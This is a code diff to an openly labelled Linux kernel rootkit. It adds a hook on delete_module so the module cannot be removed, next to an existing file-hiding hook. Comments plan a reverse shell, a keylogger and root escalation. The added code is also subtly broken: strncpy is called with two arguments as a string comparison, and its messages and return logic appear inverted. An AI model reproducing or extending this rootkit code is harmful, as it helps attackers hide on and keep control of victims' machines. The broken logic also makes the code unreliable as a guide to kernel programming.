@@ -149,8 +149,22 @@ KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr 
 struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name) {
     if (should_hide_file(name->name)) {
         return NULL;
-	}
+    }
     return KHOOK_ORIGIN(__d_lookup, parent, name);
+}
+
+/**
+ * Block removal of the rootkit
+ */
+
+KHOOK(delete_module);
+static long khook_delete_module(const char __user *name_user, unsigned int flags) {
+    if (!strncpy(module_name, name_user)) {
+        printk(KERN_INFO "This sounds like a good time to reinstall your OS.");
+        return -ENOENT;
+    }
+    printk(KERN_INFO "Not trying to remove our module.");
+    return KHOOK_ORIGIN(delete_module, name_user, flags);
 }
 
 /**
@@ -209,9 +223,9 @@ static void poll_for_commands(unsigned long data) {
         // TODO: Set up reverse shell.
     }
 
-	// TODO: Check for change in hidden file hiding
-	// TODO: Check for keylogger enabling
-	// TODO: Check for escalating to root privs.
+    // TODO: Check for change in hidden file hiding
+    // TODO: Check for keylogger enabling
+    // TODO: Check for escalating to root privs.
     set_timer(&polling_timer);
 }
 
